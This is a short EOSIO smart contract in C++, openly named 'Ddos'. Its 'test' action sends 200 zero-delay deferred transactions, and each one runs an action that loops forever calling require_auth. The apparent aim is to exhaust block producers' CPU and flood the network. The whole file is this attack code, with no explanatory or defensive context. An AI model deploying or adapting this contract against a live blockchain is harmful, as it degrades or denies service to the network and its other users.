#include <eosiolib/eosio.hpp>
#include <eosiolib/print.hpp>
#include <eosiolib/transaction.hpp>

using namespace eosio;

class Ddos: public eosio::contract {
  public:
      using contract::contract;

      /// @abi action 
      void test(uint32_t start) {
        uint32_t end = start + 200;
        for (int i=start;i < end; i++) {
			eosio::transaction txn{};
			txn.actions.emplace_back(
				eosio::permission_level(_self, N(active)),
				_self,
				N(test1),
				std::make_tuple(i));
			txn.delay_sec = 0;
			//(sender_id, payer, replace_existed)
			txn.send(i, _self, false);
        }
      }

      /// @abi action 
      void test1(uint8_t i) {
		while(true) {
			require_auth(_self);
		}
      }
};

EOSIO_ABI( Ddos, (test)(test1) )
